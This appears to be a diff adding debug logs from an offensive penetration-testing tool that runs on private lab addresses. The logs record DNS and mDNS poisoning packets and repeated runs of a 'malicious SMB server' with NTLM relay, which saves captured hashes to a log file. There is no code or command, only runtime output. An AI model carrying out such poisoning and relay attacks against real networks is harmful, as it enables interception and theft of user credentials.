+2021-11-03 20:49:04.258 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.261 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:04.262 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.265 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:04.265 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.267 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:04.268 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.269 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:04.269 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.811 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:04.811 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.811 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
+2021-11-03 20:49:04.847 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:04.848 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.848 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-03 20:49:04.888 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:04.888 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.889 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:04.890 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.891 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:04.891 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:04.893 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:04.893 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:05.244 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:05.244 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:05.245 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:05.246 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:05.821 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:05.821 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:49:05.824 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
+2021-11-03 20:49:05.824 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2021-11-03 20:53:02.253 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:138 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 20:53:02.254 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
+2021-11-03 20:53:02.266 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 20:53:02.271 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 20:53:03.474 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:82 - Exiting smb relay attack ...
+2021-11-03 20:53:05.489 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:123 - The attack is already running in the background
+2021-11-03 20:53:56.607 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:139 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 20:53:56.608 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
+2021-11-03 20:53:56.616 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:87 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
+2021-11-03 20:53:56.619 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 20:53:56.624 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 20:53:59.097 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
+2021-11-03 20:54:08.264 | ERROR    | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:49 - There is not mss process in the background
+2021-11-03 20:54:18.234 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:139 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 20:54:18.234 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
+2021-11-03 20:54:18.239 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:87 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
+2021-11-03 20:54:18.241 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 20:54:18.243 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 20:54:21.200 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
+2021-11-03 20:54:58.379 | ERROR    | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:49 - There is not mss process in the background
+2021-11-03 20:58:13.659 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:139 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 20:58:13.659 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
+2021-11-03 20:58:13.663 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:87 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
+2021-11-03 20:58:13.665 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 20:58:13.666 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 20:58:18.225 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
+2021-11-03 20:59:26.634 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:138 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-11-03 20:59:26.635 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
+2021-11-03 20:59:26.645 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:86 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
+2021-11-03 20:59:26.650 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
+2021-11-03 20:59:26.652 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
+2021-11-03 20:59:29.162 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
+2021-11-03 20:59:33.473 | ERROR    | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:49 - There is not mss process in the background
